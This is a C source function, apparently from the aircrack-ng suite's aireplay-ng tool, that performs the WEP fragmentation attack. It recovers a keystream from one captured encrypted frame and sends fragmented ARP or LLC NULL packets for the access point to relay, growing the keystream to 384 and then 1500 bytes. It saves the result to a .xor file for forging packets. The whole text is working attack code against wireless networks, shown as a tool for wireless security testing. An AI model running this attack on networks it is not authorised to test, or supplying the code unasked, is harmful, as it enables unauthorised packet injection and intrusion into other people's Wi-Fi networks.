int do_attack_fragment()
{
    unsigned char packet[4096];
    unsigned char packet2[4096];
    unsigned char prga[4096];
    unsigned char iv[4];

//    unsigned char ack[14] = "\xd4";

    char strbuf[256];

    struct tm *lt;
    struct timeval tv, tv2;

    int done;
    int caplen;
    int caplen2;
    int arplen;
    int round;
    int prga_len;
    int isrelay;
    int again;
    int length;
    int ret;
    int gotit;
    int acksgot;
    int packets;
    int z;

    unsigned char *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08\x00";

    done = caplen = caplen2 = arplen = round = 0;
    prga_len = isrelay = gotit = again = length = 0;

    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a source MAC (-h).\n" );
        return( 1 );
    }

    if(getnet(NULL, 1, 1) != 0)
        return 1;

    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
    {
        memset( opt.r_dmac, '\xFF', 6);
        opt.r_dmac[5] = 0xED;
    }

    if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )
    {
        memset( opt.r_sip, '\xFF', 4);
    }

    if( memcmp( opt.r_dip, NULL_MAC, 4 ) == 0 )
    {
        memset( opt.r_dip, '\xFF', 4);
    }

    PCT; printf ("Waiting for a data packet...\n");

    while(!done)  //
    {
        round = 0;

        if( capture_ask_packet( &caplen, 0 ) != 0 )
            return -1;

        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
            z+=2;

        if((unsigned)caplen > sizeof(packet) || (unsigned)caplen > sizeof(packet2))
            continue;

        memcpy( packet2, h80211, caplen );
        caplen2 = caplen;
        PCT; printf("Data packet found!\n");

        if ( memcmp( packet2 +  4, SPANTREE, 6 ) == 0 ||
             memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )
        {
            packet2[z+4] = ((packet2[z+4] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
            packet2[z+5] = ((packet2[z+5] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
            packet2[z+10] = ((packet2[z+10] ^ 0x00) ^ 0x08);  //0x00 instead of 0x08
        }

        prga_len = 7;

        again = RETRY;

        memcpy( packet, packet2, caplen2 );
        caplen = caplen2;
        memcpy(prga, packet+z+4, prga_len);
        memcpy(iv, packet+z, 4);

        xor_keystream(prga, snap_header, prga_len);

        while(again == RETRY)  //sending 7byte fragments
        {
            again = 0;

            arplen=60;
            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);

            if ((round % 2) == 1)
            {
                PCT; printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', 39);
                arplen=63;
            }

            acksgot=0;
            packets=(arplen-24)/(prga_len-4);
            if( (arplen-24)%(prga_len-4) != 0 )
                packets++;

            PCT; printf("Sending fragmented packet\n");
            send_fragments(h80211, arplen, iv, prga, prga_len-4, 0);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );


            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, sizeof(packet), NULL);
                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
                    z+=2;

                if (packet[0] == 0xD4 )
                {
                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
                    {
                        acksgot++;
                    }
                    continue;
                }

                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) )  //Is a FromDS packet
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen-z < 66)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    PCT; printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
                {
                    PCT; printf("Not enough acks, repeating...\n");
                    again = RETRY;
                    break;
                }

                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                {
                    PCT; printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        PCT; printf("Still nothing, trying another packet...\n");
                        again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
        if (caplen-z == 68-24)
        {
            //Thats the ARP packet!
//             PCT; printf("Thats our ARP packet!\n");
        }
        if (caplen-z == 71-24)
        {
            //Thats the LLC NULL packet!
//             PCT; printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', 39);
        }

        if (! isrelay)
        {
            //Building expected cleartext
            unsigned char ct[4096] = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
            //Ethernet & ARP header

            //Followed by the senders MAC and IP:
            memcpy(ct+16, packet+16, 6);
            memcpy(ct+22, opt.r_dip,  4);

            //And our own MAC and IP:
            memcpy(ct+26, opt.r_smac,   6);
            memcpy(ct+32, opt.r_sip,   4);

            //Calculating
            memcpy(prga, packet+z+4, 36);
            xor_keystream(prga, ct, 36);
        }
        else
        {
            memcpy(prga, packet+z+4, 36);
            xor_keystream(prga, h80211+24, 36);
        }

        memcpy(iv, packet+z, 4);
        round = 0;
        again = RETRY;
        while(again == RETRY)
        {
            again = 0;

            PCT; printf("Trying to get 384 bytes of a keystream\n");

            arplen=408;

            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);
            if ((round % 2) == 1)
            {
                PCT; printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', arplen+8);
                arplen+=32;
            }

            acksgot=0;
            packets=(arplen-24)/(32);
            if( (arplen-24)%(32) != 0 )
                packets++;

            send_fragments(h80211, arplen, iv, prga, 32, 0);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );

            gotit=0;
            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, sizeof(packet), NULL);
                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
                    z+=2;

                if (packet[0] == 0xD4 )
                {
                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
                        acksgot++;
                    continue;
                }

                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen-z > 400-24 && caplen-z < 500-24)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    PCT; printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
                {
                    PCT; printf("Not enough acks, repeating...\n");
                    again = RETRY;
                    break;
                }

                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                {
                    PCT; printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        PCT; printf("Still nothing, trying another packet...\n");
                        again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);
        if (caplen-z == 416-24)
        {
            //Thats the ARP packet!
//             PCT; printf("Thats our ARP packet!\n");
        }
        if (caplen-z == 448-24)
        {
            //Thats the LLC NULL packet!
//             PCT; printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', 416);
        }

        memcpy(iv, packet+z, 4);
        memcpy(prga, packet+z+4, 384);
        xor_keystream(prga, h80211+24, 384);

        round = 0;
        again = RETRY;
        while(again == RETRY)
        {
            again = 0;

            PCT; printf("Trying to get 1500 bytes of a keystream\n");

            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 1500);
            arplen=1500;
            if ((round % 2) == 1)
            {
                PCT; printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', 1508);
                arplen+=32;
            }

            acksgot=0;
            packets=(arplen-24)/(300);
            if( (arplen-24)%(300) != 0 )
                packets++;

            send_fragments(h80211, arplen, iv, prga, 300, 0);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );

            gotit=0;
            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, sizeof(packet), NULL);
                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
                    z+=2;

                if (packet[0] == 0xD4 )
                {
                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
                        acksgot++;
                    continue;
                }

                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen-z > 1496-24)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    PCT; printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
                {
                    PCT; printf("Not enough acks, repeating...\n");
                    again = RETRY;
                    break;
                }

                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                {
                    PCT; printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        printf("Still nothing, quitting with 384 bytes? [y/n] \n");
                        fflush( stdout );
                        ret=0;
                        while(!ret) ret = scanf( "%s", tmpbuf );

                        printf( "\n" );

                        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
                            again = ABORT;
                        else
                            again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        if(again == ABORT) length = 408;
        else length = 1500;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);
        if (caplen == length+8+z)
        {
            //Thats the ARP packet!
//             PCT; printf("Thats our ARP packet!\n");
        }
        if (caplen == length+16+z)
        {
            //Thats the LLC NULL packet!
//             PCT; printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', length+8);
        }

        if(again != ABORT)
        {
            memcpy(iv, packet+z, 4);
            memcpy(prga, packet+z+4, length);
            xor_keystream(prga, h80211+24, length);
        }

        lt = localtime( (const time_t *) &tv.tv_sec );

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "fragment-%02d%02d-%02d%02d%02d.xor",
                  lt->tm_mon + 1, lt->tm_mday,
                  lt->tm_hour, lt->tm_min, lt->tm_sec );
        save_prga(strbuf, iv, prga, length);

        printf( "Saving keystream in %s\n", strbuf );
        printf("Now you can build a packet with packetforge-ng out of that %d bytes keystream\n", length);

        done=1;

    }

    return( 0 );
}